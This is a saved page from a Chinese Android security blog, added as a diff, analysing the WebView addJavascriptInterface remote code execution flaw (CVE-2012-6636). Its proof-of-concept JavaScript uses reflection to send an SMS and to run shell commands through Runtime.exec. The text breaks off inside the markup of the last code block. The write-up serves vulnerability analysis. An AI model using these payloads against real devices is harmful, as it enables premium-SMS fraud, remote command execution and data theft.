@@ -1,0 +1,570 @@
+<!DOCTYPE html><!--[if lt IE 7]><html class="no-js lt-ie9 lt-ie8 lt-ie7" lang="zh-CN"> <![endif]--><!--[if IE 7]> <html class="no-js lt-ie9 lt-ie8" lang="zh-CN"> <![endif]--><!--[if IE 8]> <html class="no-js lt-ie9" lang="zh-CN"> <![endif]--><!--[if gt IE 8]><!-->
+<!-- saved from url=(0122)http://www.droidsec.cn/webview-%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e%e6%b5%85%e6%9e%90/ -->
+<html class="no-js" lang="zh-CN"><!--<![endif]--><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Android Security 安卓安全中文站 | 移动安全技术与资讯分享 | 安卓应用漏洞挖掘 | 安卓漏洞攻防">
+<meta name="author" content="K | Uazoh.com">
+<title>WebView 远程代码执行漏洞浅析  |  DroidSec.cn</title>
+<link rel="icon" type="image/png" href="http://www.droidsec.cn/wp-content/uploads/2015/03/1112.png"><link rel="alternate" type="application/rss+xml" title="DroidSec.cn » WebView 远程代码执行漏洞浅析评论Feed" href="http://www.droidsec.cn/webview-%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e%e6%b5%85%e6%9e%90/feed/">
+		<style type="text/css"></style>
+		<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+<link rel="stylesheet" id="crayon-css" href="WebView 远程代码执行漏洞浅析 _ DroidSec.cn_files/crayon.min.css" type="text/css" media="all">
+<link rel="stylesheet" id="crayon-theme-github-css" href="WebView 远程代码执行漏洞浅析 _ DroidSec.cn_files/github.css" type="text/css" media="all">
+<link rel="stylesheet" id="crayon-font-monaco-css" href="WebView 远程代码执行漏洞浅析 _ DroidSec.cn_files/monaco.css" type="text/css" media="all">
+<link rel="stylesheet" id="uazoh-bootstrap-css" href="WebView 远程代码执行漏洞浅析 _ DroidSec.cn_files/bootstrap.min.css" type="text/css" media="all">
+<link rel="stylesheet" id="uazoh-animate-css" href="WebView 远程代码执行漏洞浅析 _ DroidSec.cn_files/animate.css" type="text/css" media="all">
+<link rel="stylesheet" id="uazoh-mCustomScrollbar-css" href="WebView 远程代码执行漏洞浅析 _ DroidSec.cn_files/jquery.mCustomScrollbar.css" type="text/css" media="all">
+<link rel="stylesheet" id="uazoh-font-awesome-css" href="WebView 远程代码执行漏洞浅析 _ DroidSec.cn_files/font-awesome.min.css" type="text/css" media="all">
+<link rel="stylesheet" id="uazoh-main-css" href="WebView 远程代码执行漏洞浅析 _ DroidSec.cn_files/main.css" type="text/css" media="all">
+<link rel="stylesheet" id="uazoh-h1-css" href="WebView 远程代码执行漏洞浅析 _ DroidSec.cn_files/h1.css" type="text/css" media="all">
+<link rel="stylesheet" id="uazoh-responsive-css" href="WebView 远程代码执行漏洞浅析 _ DroidSec.cn_files/responsive.css" type="text/css" media="all">
+<link rel="stylesheet" id="uazoh-color-scheme-css" href="WebView 远程代码执行漏洞浅析 _ DroidSec.cn_files/color.css" type="text/css" media="all">
+<link rel="stylesheet" id="uazoh-default-style-css" href="WebView 远程代码执行漏洞浅析 _ DroidSec.cn_files/style.css" type="text/css" media="all">
+<link rel="stylesheet" id="uazoh-LayerSlider-css" href="WebView 远程代码执行漏洞浅析 _ DroidSec.cn_files/layerslider.css" type="text/css" media="all">
+
+
+
+
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://www.droidsec.cn/xmlrpc.php?rsd">
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://www.droidsec.cn/wp-includes/wlwmanifest.xml"> 
+<link rel="prev" title="安卓版Dropbox SDK被爆存在远程利用漏洞，目前已紧急修复" href="http://www.droidsec.cn/%e5%ae%89%e5%8d%93%e7%89%88dropbox-sdk%e5%ad%98%e5%9c%a8%e8%bf%9c%e7%a8%8b%e5%88%a9%e7%94%a8%e6%bc%8f%e6%b4%9e/">
+<link rel="next" title="SecureRandom漏洞解析" href="http://www.droidsec.cn/securerandom%e6%bc%8f%e6%b4%9e%e8%a7%a3%e6%9e%90/">
+<meta name="generator" content="WordPress 4.2.2">
+<link rel="canonical" href="WebView 远程代码执行漏洞浅析 _ DroidSec.cn_files/WebView 远程代码执行漏洞浅析 _ DroidSec.cn.html">
+<link rel="shortlink" href="http://www.droidsec.cn/?p=155">
+<style type="text/css" media="screen">#wp-admin-bar-user-info .avatar-64 {width:64px}</style>
+<style></style></head>
+<body class="single single-post postid-155 single-format-standard">
+<!--专版参数-->
+<div id="to-the-top" title="返回顶端" style="display: block;"><i class="fa fa-chevron-up"></i></div>
+<!--移动菜单-->
+<i class="fa fa-align-justify" id="uazoh7-mobile-menu-btn"></i>
+<div class="uazoh7-mobile-menu" id="uazoh7-mobile-menu"> <h3>菜单</h3>
+<nav class="menu-%e8%8f%9c%e5%8d%951-container mCustomScrollbar _mCS_1" style="max-height: 871px; overflow: hidden;"><div class="mCustomScrollBox mCS-light" id="mCSB_1" style="position: relative; height: 100%; overflow: hidden; max-width: 100%; max-height: 871px;"><div class="mCSB_container mCS_no_scrollbar" style="position:relative; top:0;"><ul id="mobile_nav" class="mobile-menu"><li><a href="http://www.droidsec.cn/">首页</a><span class="border"></span></li>
+<li><a href="http://www.droidsec.cn/android-security-basic/">Android安全基础</a><span class="border"></span></li>
+<li><a href="http://www.droidsec.cn/app%e5%ae%89%e5%85%a8%e6%b5%8b%e8%af%95%e5%85%a5%e9%97%a8/">APP安全测试入门</a><span class="border"></span></li>
+<li><a href="http://www.droidsec.cn/%e9%87%91%e5%88%9a%e5%ae%a1%e8%ae%a1%e7%b3%bb%e7%bb%9f/">金刚审计系统</a><span class="border"></span></li>
+<li><a href="http://www.droidsec.cn/%e5%85%b3%e4%ba%8e%e6%9c%ac%e7%ab%99/">关于DroidSec</a><span class="border"></span></li>
+<li><a href="http://weibo.com/androidsec">关注本站微博</a><span class="border"></span></li>
+</ul></div><div class="mCSB_scrollTools" style="position: absolute; display: none;"><div class="mCSB_draggerContainer"><div class="mCSB_dragger" style="position: absolute; top: 0px;" oncontextmenu="return false;"><div class="mCSB_dragger_bar" style="position:relative;"></div></div><div class="mCSB_draggerRail"></div></div></div></div><span class="border"></span></nav></div>
+    <header class="uazoh7-header uazoh7-header-1">
+
+      <div class="uazoh7-top-bar">
+        <div class="container">
+          <div class="row">
+            <div class="col-lg-12">
+              
+              <ul class="social-btns">
+								<li><a href="http://www.droidsec.cn/feed" title="rss" class="rss regular" target="_blank"><i class="fa fa-rss"></i></a><a href="http://www.droidsec.cn/feed" title="rss" class="rss hover" target="_blank"><i class="fa fa-rss"></i></a></li><li><a href="http://weibo.com/androidsec" title="weibo" class="weibo regular" target="_blank"><i class="fa fa-weibo"></i></a><a href="http://weibo.com/androidsec" title="weibo" class="weibo hover" target="_blank"><i class="fa fa-weibo"></i></a></li><li><a href="http://droidsec/#QQ.com" title="envelope" class="envelope regular" target="_blank"><i class="fa fa-envelope"></i></a><a href="http://droidsec/#QQ.com" title="envelope" class="envelope hover" target="_blank"><i class="fa fa-envelope"></i></a></li>              </ul>
+            </div>
+          </div>
+        </div>
+      </div>	   <div class="uazoh7-header-bg uazoh7-header-sticked" id="uazoh7-header-menu">
+        <div class="container">
+          <div class="row">
+            <div class="col-lg-12">
+              <div class="uazoh7-relative">
+                <a href="http://www.droidsec.cn/" title="DroidSec.cn">
+                <div class="uazoh7-logo">                  <img src="WebView 远程代码执行漏洞浅析 _ DroidSec.cn_files/a1a.png" alt="DroidSec.cn">                  <p class="logo">DroidSec.cn</p>
+                  <p class="tagline">安卓安全中文站</p>
+                </div>
+                </a>
+				<nav class="menu-%e8%8f%9c%e5%8d%951-container"><ul id="main_nav" class="main-menu"><li><a href="http://www.droidsec.cn/">首页</a><span class="hover" style="display: none;"></span></li>
+<li><a href="http://www.droidsec.cn/android-security-basic/">Android安全基础</a><span class="hover" style="display: block; opacity: 0.000986636;"></span></li>
+<li><a href="http://www.droidsec.cn/app%e5%ae%89%e5%85%a8%e6%b5%8b%e8%af%95%e5%85%a5%e9%97%a8/">APP安全测试入门</a><span class="hover"></span></li>
+<li><a href="http://www.droidsec.cn/%e9%87%91%e5%88%9a%e5%ae%a1%e8%ae%a1%e7%b3%bb%e7%bb%9f/">金刚审计系统</a><span class="hover"></span></li>
+<li><a href="http://www.droidsec.cn/%e5%85%b3%e4%ba%8e%e6%9c%ac%e7%ab%99/">关于DroidSec</a><span class="hover"></span></li>
+<li><a href="http://weibo.com/androidsec">关注本站微博</a><span class="hover"></span></li>
+</ul></nav>              </div>
+            </div>
+          </div>
+        </div>
+      </div>    </header><div class="uazoh7-content" style="padding-top: 101px;"><section class="uazoh7-page-title-1" data-stellar-background-ratio="0.5">
+        <div class="container">
+          <div class="row">
+            <div class="col-lg-9 col-md-9 col-sm-9">
+			
+								<h1>文章</h1>
+				            </div>
+            <div class="col-lg-3 col-md-3 col-sm-3">
+              <form class="search" method="get" action="http://www.droidsec.cn/"><input type="text" placeholder="输入关键词后回车..." id="s" name="s" value=""><button type="submit" value="Search"><i class="fa fa-search"></i></button></form>            </div>
+          </div>
+        </div>
+      </section>
+      <section class="uazoh7-desktop-breadscrubs">
+        <div class="container">
+          <div class="row">
+            <div class="col-lg-12">
+              <div class="uazoh7-desktop-breadscrubs-inner">
+                 <a href="http://www.droidsec.cn/">Home</a> <i class="fa fa-angle-double-right"></i> <a href="http://www.droidsec.cn/category/app%e6%bc%8f%e6%b4%9e%e6%8c%96%e6%8e%98/">APP漏洞挖掘</a> <i class="fa fa-angle-double-right"></i> WebView 远程代码执行漏洞浅析              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+      <section class="uazoh7-mobile-breadscrubs">
+        <div class="container">
+          <div class="row">
+            <div class="col-lg-12">
+               <a href="http://www.droidsec.cn/">Home</a> <i class="fa fa-angle-double-right"></i> <a href="http://www.droidsec.cn/category/app%e6%bc%8f%e6%b4%9e%e6%8c%96%e6%8e%98/">APP漏洞挖掘</a> <i class="fa fa-angle-double-right"></i> WebView 远程代码执行漏洞浅析            </div>
+          </div>
+        </div>
+      </section><section class="uazoh7-section">
+<div class="container">
+<div class="row" style="margin-top: 0px;">
+<div class="col-lg-9" id="main"><article id="post-155" class="uazoh7-post post-155 post type-post status-publish format-standard hentry category-app tag-android-system tag-apk">
+<header>
+<h3 style="margin-top: 0px;"><i class="fa fa-pencil"></i><span> WebView 远程代码执行漏洞浅析</span></h3>
+<p> <a href="http://www.droidsec.cn/category/app%e6%bc%8f%e6%b4%9e%e6%8c%96%e6%8e%98/" rel="category tag">APP漏洞挖掘</a> by <a href="http://www.droidsec.cn/author/droidsec/" title="由droidsec发布" rel="author">droidsec</a></p>
+</header>
+
+<h2>1. WebView 远程代码执行漏洞描述</h2>
+<p>Android API level 16以及之前的版本存在远程代码执行安全漏洞，该漏洞源于程序没有正确限制使用WebView.addJavascriptInterface方法，远程攻击者可通过使用Java Reflection API利用该漏洞执行任意Java对象的方法，简单的说就是通过addJavascriptInterface给WebView加入一个JavaScript桥接接口，JavaScript通过调用这个接口可以直接操作本地的JAVA接口。该漏洞最早公布于CVE-2012-6636【1】，其描述了WebView中addJavascriptInterface API导致的远程代码执行安全漏洞。</p>
+<p>该漏洞公布的近期，多款Android流行应用曾被曝出高危挂马漏洞：点击消息或朋友社区圈中的一条网址时，用户手机然后就会自动执行被挂马的代码指令，从而导致被安装恶意扣费软件、向好友发送欺诈短信、通讯录和短信被窃取以及被远程控制等严重后果。在乌云漏洞平台上，包括Android版的微信、QQ、腾讯微博、QQ浏览器、快播、百度浏览器、金山浏览器等大批TOP应用均被曝光同类型的漏洞。</p>
+<p>论文Attacks on WebView in the <a href="http://www.droidsec.cn/tag/android-system/" class="st_tag internal_tag" rel="tag" title="Posts tagged with Android System">Android System</a>【2】中指出可以利用所导出的读写文件接口来进行文件的读写操作，攻击者可以通过中间人攻击篡改Webview所显示的页面来达到对手机文件系统的控制。</p>
+<h2>2. WebView 远程代码执行影响范围</h2>
+<p>Android API level 小于17 (即Android 4.2之前的系统版本)</p>
+<h2>3.WebView 远程代码执行漏洞详情</h2>
+<h3>1) WebView 远程代码执行漏洞位置:</h3>
+<p>WebView.addJavascriptInterface(Object obj, String interfaceName)</p>
+<h3>2)WebView 远程代码执行漏洞触发前提条件：</h3>
+<p>使用addJavascriptInterface方法注册可供JavaScript调用的Java对象；<br>
+使用WebView加载外部网页或者本地网页；<br>
+Android系统版本低于4.2；</p>
+<h3>3) WebView 远程代码执行漏洞原理：</h3>
+<p>Android系统通过WebView.addJavascriptInterface方法注册可供JavaScript调用的Java对象，以用于增强JavaScript的功能。但是系统并没有对注册Java类的方法调用的限制。导致攻击者可以利用反射机制调用未注册的其它任何Java类，最终导致JavaScript能力的无限增强。攻击者利用该漏洞可以根据客户端能力为所欲为。</p>
+<h2>4. WebView 远程代码执行漏洞POC</h2>
+<p>1) 利用addJavascriptInterface方法注册可供JavaScript调用的java对象 “injectedObj”，利用反射机制调用Android API sendTextMessage来发送短信。<br>
+java代码：</p><!-- Crayon Syntax Highlighter v2.7.1 -->
+
+		<div id="crayon-55a7aacabf4b7476305885" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style="margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;">
+		
+			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important; height: 18px !important; line-height: 18px !important; margin-top: -18px; display: none; position: absolute; z-index: 2;"><span class="crayon-title"></span>
+			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button crayon-pressed" title="切换是否显示行编号"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="点击展开代码" style="display: none;"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon"></div></div><span class="crayon-language">Java</span></div></div>
+			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
+			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly="" style="tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;">mWebView = new WebView(this);
+mWebView.getSettings().setJavaScriptEnabled(true);
+mWebView.addJavascriptInterface(this, "injectedObj");
+mWebView.loadUrl("file:///android_asset/www/index.html");</textarea></div>
+			<div class="crayon-main" style="position: relative; z-index: 1; overflow: hidden;">
+				<table class="crayon-table" style="">
+					<tbody><tr class="crayon-row">
+				<td class="crayon-nums " data-settings="show">
+					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-55a7aacabf4b7476305885-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-55a7aacabf4b7476305885-2">2</div><div class="crayon-num" data-line="crayon-55a7aacabf4b7476305885-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-55a7aacabf4b7476305885-4">4</div></div>
+				</td>
+						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-55a7aacabf4b7476305885-1"><span class="crayon-v">mWebView</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-r">new</span><span class="crayon-h"> </span><span class="crayon-e">WebView</span><span class="crayon-sy">(</span><span class="crayon-r">this</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-55a7aacabf4b7476305885-2"><span class="crayon-v">mWebView</span><span class="crayon-sy">.</span><span class="crayon-e">getSettings</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">setJavaScriptEnabled</span><span class="crayon-sy">(</span><span class="crayon-t">true</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-55a7aacabf4b7476305885-3"><span class="crayon-v">mWebView</span><span class="crayon-sy">.</span><span class="crayon-e">addJavascriptInterface</span><span class="crayon-sy">(</span><span class="crayon-r">this</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"injectedObj"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-55a7aacabf4b7476305885-4"><span class="crayon-v">mWebView</span><span class="crayon-sy">.</span><span class="crayon-e">loadUrl</span><span class="crayon-sy">(</span><span class="crayon-s">"file:///android_asset/www/index.html"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div></div></td>
+					</tr>
+				</tbody></table>
+			</div>
+		</div>
+<!-- [Format Time: 0.0040 seconds] -->
+<p>EXP的JavaScript代码：</p><!-- Crayon Syntax Highlighter v2.7.1 -->
+
+		<div id="crayon-55a7aacabf4f0744891759" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style="margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;">
+		
+			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important; height: 18px !important; line-height: 18px !important; margin-top: -18px; display: none; position: absolute; z-index: 2;"><span class="crayon-title"></span>
+			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-mixed-highlight" title="含多种语言"></span><div class="crayon-button crayon-nums-button crayon-pressed" title="切换是否显示行编号"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="点击展开代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon"></div></div><span class="crayon-language">Java</span></div></div>
+			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
+			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly="" style="tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;">&lt;html&gt;
+   &lt;body&gt;
+      &lt;script&gt;
+         var objSmsManager =     injectedObj.getClass().forName("android.telephony.SmsManager").getM ethod("getDefault",null).invoke(null,null);
+          objSmsManager.sendTextMessage("10086",null,"this message is sent by JS when webview is loading",null,null);
+       &lt;/script&gt;
+   &lt;/body&gt;
+&lt;/html&gt;</textarea></div>
+			<div class="crayon-main" style="position: relative; z-index: 1; overflow: hidden;">
+				<table class="crayon-table">
+					<tbody><tr class="crayon-row">
+				<td class="crayon-nums " data-settings="show">
+					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-55a7aacabf4f0744891759-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-55a7aacabf4f0744891759-2">2</div><div class="crayon-num" data-line="crayon-55a7aacabf4f0744891759-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-55a7aacabf4f0744891759-4">4</div><div class="crayon-num" data-line="crayon-55a7aacabf4f0744891759-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-55a7aacabf4f0744891759-6">6</div><div class="crayon-num" data-line="crayon-55a7aacabf4f0744891759-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-55a7aacabf4f0744891759-8">8</div></div>
+				</td>
+						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-55a7aacabf4f0744891759-1"><span class="crayon-e ">&lt;html&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-55a7aacabf4f0744891759-2"><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-e ">&lt;body&gt;</span></div><div class="crayon-line" id="crayon-55a7aacabf4f0744891759-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-ta">&lt;script&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-55a7aacabf4f0744891759-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-v">objSmsManager</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-v">injectedObj</span><span class="crayon-sy">.</span><span class="crayon-e">getClass</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">forName</span><span class="crayon-sy">(</span><span class="crayon-s">"android.telephony.SmsManager"</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">getM </span><span class="crayon-e">ethod</span><span class="crayon-sy">(</span><span class="crayon-s">"getDefault"</span><span class="crayon-sy">,</span><span class="crayon-t">null</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">invoke</span><span class="crayon-sy">(</span><span class="crayon-t">null</span><span class="crayon-sy">,</span><span class="crayon-t">null</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-55a7aacabf4f0744891759-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">objSmsManager</span><span class="crayon-sy">.</span><span class="crayon-e">sendTextMessage</span><span class="crayon-sy">(</span><span class="crayon-s">"10086"</span><span class="crayon-sy">,</span><span class="crayon-t">null</span><span class="crayon-sy">,</span><span class="crayon-s">"this message is sent by JS when webview is loading"</span><span class="crayon-sy">,</span><span class="crayon-t">null</span><span class="crayon-sy">,</span><span class="crayon-t">null</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-55a7aacabf4f0744891759-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-ta">&lt;/script&gt;</span></div><div class="crayon-line" id="crayon-55a7aacabf4f0744891759-7"><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-v">body</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-55a7aacabf4f0744891759-8"><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-v">html</span><span class="crayon-o">&gt;</span></div></div></td>
+					</tr>
+				</tbody></table>
+			</div>
+		</div>
+<!-- [Format Time: 0.0061 seconds] -->
+<p>2) 利用addJavascriptInterface方法注册可供JavaScript调用的java对象 “injectedObj”，利用反射机制调用Android API getRuntime执行shell命令：<br>
+EXP的JavaScript代码：</p><!-- Crayon Syntax Highlighter v2.7.1 -->
+
+		<div id="crayon-55a7aacabf4f8773844206" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style="margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;">
+		
+			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important; height: 18px !important; line-height: 18px !important; margin-top: -18px; display: none; position: absolute; z-index: 2;"><span class="crayon-title"></span>
+			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-mixed-highlight" title="含多种语言"></span><div class="crayon-button crayon-nums-button crayon-pressed" title="切换是否显示行编号"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="点击展开代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon"></div></div><span class="crayon-language">Java</span></div></div>
+			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
+			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly="" style="tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;">&lt;html&gt;
+   &lt;body&gt;
+      &lt;script&gt;
+         function execute(cmdArgs)
+         {
+             return injectedObj.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);
+         }
+
+         var res = execute(["/system/bin/sh", "-c", "ls -al /mnt/sdcard/"]);
+         document.write(getContents(res.getInputStream()));
+       &lt;/script&gt;
+   &lt;/body&gt;
+&lt;/html&gt;</textarea></div>
+			<div class="crayon-main" style="position: relative; z-index: 1; overflow: hidden;">
+				<table class="crayon-table">
+					<tbody><tr class="crayon-row">
+				<td class="crayon-nums " data-settings="show">
+					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-55a7aacabf4f8773844206-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-55a7aacabf4f8773844206-2">2</div><div class="crayon-num" data-line="crayon-55a7aacabf4f8773844206-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-55a7aacabf4f8773844206-4">4</div><div class="crayon-num" data-line="crayon-55a7aacabf4f8773844206-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-55a7aacabf4f8773844206-6">6</div><div class="crayon-num" data-line="crayon-55a7aacabf4f8773844206-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-55a7aacabf4f8773844206-8">8</div><div class="crayon-num" data-line="crayon-55a7aacabf4f8773844206-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-55a7aacabf4f8773844206-10">10</div><div class="crayon-num" data-line="crayon-55a7aacabf4f8773844206-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-55a7aacabf4f8773844206-12">12</div><div class="crayon-num" data-line="crayon-55a7aacabf4f8773844206-13">13</div></div>
+				</td>
+						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-55a7aacabf4f8773844206-1"><span class="crayon-e ">&lt;html&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-55a7aacabf4f8773844206-2"><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-e ">&lt;body&gt;</span></div><div class="crayon-line" id="crayon-55a7aacabf4f8773844206-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-ta">&lt;script&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-55a7aacabf4f8773844206-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">execute</span><span class="crayon-sy">(</span><span class="crayon-v">cmdArgs</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-55a7aacabf4f8773844206-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-55a7aacabf4f8773844206-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-v">injectedObj</span><span class="crayon-sy">.</span><span class="crayon-e">getClass</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">forName</span><span class="crayon-sy">(</span><span class="crayon-s">"java.lang.Runtime"</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">getMethod</span><span class="crayon-sy">(</span><span class="crayon-s">"getRuntime"</span><span class="crayon-sy">,</span><span class="crayon-t">null</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">invoke</span><span class="crayon-sy">(</span><span class="crayon-t">null</span><span class="crayon-sy">,</span><span class="crayon-t">null</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">exec</span><span class="crayon-sy">(</span><span class="crayon-v">cmdArgs</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-55a7aacabf4f8773844206-7"><span 